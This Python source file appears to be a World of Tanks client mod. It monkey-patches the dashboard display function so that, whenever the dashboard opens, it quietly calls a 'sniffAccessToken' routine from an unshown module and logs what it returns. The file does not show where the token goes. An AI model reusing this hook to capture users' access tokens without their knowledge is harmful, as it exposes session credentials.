import logging
from items import vehicles, tankmen, EQUIPMENT_TYPES, ItemsPrices
import os
from ConfigParser import ConfigParser
import BigWorld
from helpers import getFullClientVersion, getShortClientVersion, getClientVersion

import importlib
import ResMgr
import string
from items.components.shared_components import ModelStatesPaths

import nations
from items.components import path_builder

from helpers.server_settings import ServerSettings

_logger = logging.getLogger(__name__)
_logger.info('WoTAPIPy')

import adisp
from adisp import async, process

from gui.shared import event_dispatcher as shared_event_dispatcher

old_showDashboardView = shared_event_dispatcher.showDashboardView

def new_showDashboardView():
  _logger.info('Overriding showDashboardView')
  
  _logger.info('Calling pullToken')
  pullToken()  
  
  _logger.info('Calling base showDashboardView')
  old_showDashboardView()
  
_logger.info('Overriding event_dispatcher.showDashboardView')
shared_event_dispatcher.showDashboardView = new_showDashboardView

@adisp.process
def pullToken():
  _logger.info('AccessTokenModule')
  try:
    from AccessTokenModule import sniffAccessToken

    def callback(productInfo):
      _logger.info(productInfo)

    _logger.info('Calling sniffAccessToken')
    productInfo = yield sniffAccessToken(37)
  except Exception as e:
    _logger.error(e)

